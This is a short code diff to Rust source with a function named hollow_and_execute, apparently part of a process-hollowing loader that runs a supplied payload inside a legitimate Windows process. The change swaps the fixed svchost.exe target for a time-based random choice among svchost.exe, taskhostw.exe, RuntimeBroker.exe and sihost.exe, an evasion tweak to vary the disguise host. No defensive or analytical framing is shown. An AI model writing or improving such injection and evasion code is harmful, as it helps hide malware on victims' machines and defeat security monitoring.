@@ -176,7 +176,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
     let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
-    let svchost_path = format!("{}\\System32\\svchost.exe", system_root);
+    
+    let hosts = ["svchost.exe", "taskhostw.exe", "RuntimeBroker.exe", "sihost.exe"];
+    let host = hosts[std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as usize % hosts.len()];
+    let svchost_path = format!("{}\\System32\\{}", system_root, host);
 
     let cmd: Vec<u16> = OsStr::new(&svchost_path)
         .encode_wide()
